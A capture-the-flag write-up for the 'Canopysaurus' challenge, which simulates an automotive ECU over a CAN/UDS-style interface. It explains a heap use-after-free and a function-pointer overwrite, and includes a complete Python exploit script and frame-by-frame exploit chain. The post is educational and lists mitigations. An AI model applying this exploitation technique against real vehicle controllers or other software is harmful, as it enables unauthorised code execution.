---
layout: post
title: "SHC 2026: Canopysaurus - Heap UAF Function Pointer Hijack on an Automotive ECU Simulator"
date: 2026-05-08
tags: [pwn, re]
---

## Challenge Overview

| Property | Value |
|---|---|
| Binary | `ecu_sim` (gcc -no-pie -g -fno-stack-protector) |
| Vulnerability | Heap Use-After-Free — function pointer hijack |
| Category | pwn |
| Flag format | DACH2026{...} |

Canopysaurus simulates a **Dino Control Unit (DCU)** exposing a CAN bus diagnostic interface over TCP. Players send **UDS (Unified Dino Services)** messages as raw 16-byte SocketCAN `can_frame` packets — exactly like a real automotive ECU.

Goal: make `reset_code()` execute. It reads `/flag.txt` and streams it back.

## Binary Analysis

### Compilation Flags

| Flag | Impact |
|---|---|
| `-no-pie` | Fixed load address — `reset_code()` has a static address |
| `-g` | Debug symbols — nm/objdump reveals all symbols |
| `-fno-stack-protector` | No stack canary |
| `-D_FORTIFY_SOURCE=0` | No glibc fortify checks |

### Getting the Target Address

```bash
nm --defined-only ./ecu_sim | grep reset_code
# 00000000004014bc T reset_code
```

`reset_code()` is at **0x4014bc** — same on remote (identical Ubuntu 22.04 build environment).

### Key Data Structures (both 80 bytes)

| Struct | Field | Offset | Notes |
|---|---|---|---|
| `dtc_entry_t` | `dtc_code` | +0 | 4 bytes |
| | `status` | +4 | 1 byte — used for ReadDTC mask |
| | `report_fn` | +8 | **8-byte function pointer — the target** |
| | `description[56]` | +16 | 56 bytes |
| `did_record_t` | `did_id` | +0 | 2 bytes |
| | `data_len` | +2 | 2 bytes |
| | `data[64]` | +4 | **64-byte attacker-controlled payload** |

**Critical overlap:** `did_record.data[4..11]` == `dtc_entry.report_fn`

## The Vulnerability: Heap Use-After-Free

In `handle_clear_dtc()`:

```c
for (int i = 0; i < dtc_count; i++) {
    if (dtc_table[i]) {
        free(dtc_table[i]);
        // MISSING: dtc_table[i] = NULL;
    }
}
// MISSING: dtc_count = 0;
// dtc_table[0] is now a dangling pointer!
```

After free, `dtc_count` remains 1 and `dtc_table[0]` still holds the freed address. glibc tcache will return the same 80-byte chunk on the next `malloc(80)` call — creating the UAF.

## Why SecurityAccess Is a Red Herring

The `0x27 SecurityAccess` service with `seed ^ 0xCAFEBABE` looks mandatory. However, **none of the services in the exploit chain check `security_level`** — only `session_type != SESSION_DEFAULT`. A single extended session is enough. Intentional red herring.

## Exploit Chain

| # | UDS Frame | Effect |
|---|---|---|
| 1 | `0x10 0x03` | Enter extended session |
| 2 | `0x34 00 01 AA BB CC FF` | RequestDownload — `malloc(80)` — dtc_entry_t [chunk A] |
| 3 | `0x14 FF FF FF` | ClearDTC — `free(chunk A)` — **UAF triggered** |
| 4 | `0x2E 12 34 DE AD` | WriteDID — `malloc(80)` — tcache returns chunk A as did_record_t |
| 5a–e | `0x31 ...` | RoutineControl: write 12 bytes to DID data — overwrites `report_fn` with `0x4014bc` |
| 6 | `0x19 02 FF` | ReadDTC — `entry->report_fn(entry)` — `reset_code()` — flag |

### Memory Layout After Step 5

```
chunk A (80 bytes):
+00  34 12        → did_record.did_id = 0x1234
+04  FF           → did_record.data[0]  == dtc_entry.status = 0xFF (mask match)
+08  BC 14 40 00  → did_record.data[4..7] == dtc_entry.report_fn [low 4B]
     00 00 00 00  → did_record.data[8..11] == dtc_entry.report_fn [high 4B]
                 → report_fn = 0x00000000004014bc = reset_code()
```

## Exploit Script

```python
import socket, ssl, struct

HOST = '4bb1c37c-...challs.qualifier.swiss-hacking-challenge.ch'
PORT = 31337
RESET_CODE_ADDR = 0x4014bc

def make_can_frame(can_id, data):
    frame  = struct.pack('<I', can_id)
    frame += struct.pack('B', len(data))
    frame += b'\x00\x00\x00'
    frame += data.ljust(8, b'\x00')
    return frame  # 16 bytes

def make_uds(payload, can_id=0x7DF):
    return make_can_frame(can_id, bytes([len(payload)]) + payload)

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ctx.check_hostname = ctx.verify_mode = False
sock = ctx.wrap_socket(socket.create_connection((HOST, PORT)))

def send(p): sock.sendall(make_uds(p))

send(bytes([0x10, 0x03]))                         # 1. Extended session
send(bytes([0x34,0x00,0x01,0xAA,0xBB,0xCC,0xFF])) # 2. Alloc dtc_entry
send(bytes([0x14, 0xFF, 0xFF, 0xFF]))              # 3. Free (UAF!)
send(bytes([0x2E, 0x12, 0x34, 0xDE, 0xAD]))       # 4. Alloc did_record (same chunk)

buf = bytes([0xFF,0x00,0x00,0x00]) + struct.pack('<Q', RESET_CODE_ADDR)
send(bytes([0x31,0x01,0xFF,0x01,0x12,0x34,0x0C])) # 5a. RC start
for off in range(0, 12, 3):                        # 5b-e. Write in chunks
    send(bytes([0x31,0x03,0xFF,0x01]) + buf[off:off+3])

send(bytes([0x19, 0x02, 0xFF]))                    # 6. Trigger -> flag
```

## Key Takeaways

- **Heap UAF**: Always null the pointer after `free()`. Always reset counters.
- **Function pointer hijack**: Direct calls through struct function pointers with no CFI are perfect hijack targets.
- **Struct size collision**: Both structs were 80 bytes — glibc tcache guaranteed same-chunk reuse.
- **Mitigations that would have helped**: PIE (needs address leak), null-after-free, CFI, safe-linking (glibc ≥ 2.32).
